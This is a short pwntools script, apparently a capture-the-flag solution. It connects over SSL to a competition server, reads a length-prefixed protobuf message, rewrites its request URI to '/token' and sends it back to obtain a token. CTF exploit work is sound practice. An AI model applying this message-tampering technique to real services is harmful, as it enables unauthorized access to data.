from pwn import *
import struct
import binascii
import format_pb2

context(arch='x86_64', os='linux', log_level='debug')

conn = remote('ssl-added-and-removed-here.ctfcompetition.com', 1876, ssl=True)


def read_msg():
	length = u32(conn.recv(4))
	request = format_pb2.Exchange()
	data = conn.recv(length)
	request.ParseFromString(data)
	log.info("< %s" % request)
	return request

def send_msg(payload):
	log.info("> %s" % payload)
	data = payload.SerializeToString()
	output = p32(len(data)) + data
	conn.send(output)

i = read_msg()
i.request.uri = "/token"
send_msg(i)
read_msg()
